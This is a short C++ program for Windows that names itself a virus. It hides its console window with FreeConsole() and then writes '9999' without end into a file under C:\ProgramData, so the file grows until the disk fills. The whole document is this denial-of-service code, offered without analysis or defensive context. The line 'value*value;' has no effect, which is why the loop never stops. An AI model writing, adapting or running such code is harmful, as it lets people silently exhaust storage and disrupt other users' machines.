#include <iostream>
#include <fstream>
#include <windows.h>

using namespace std;

int main(){
	FreeConsole();
	int value = 9999;
	ofstream virus;
	virus.open("c://ProgramData//elite.virus");
	while(value){
		virus << value;
		value*value;
	}
}
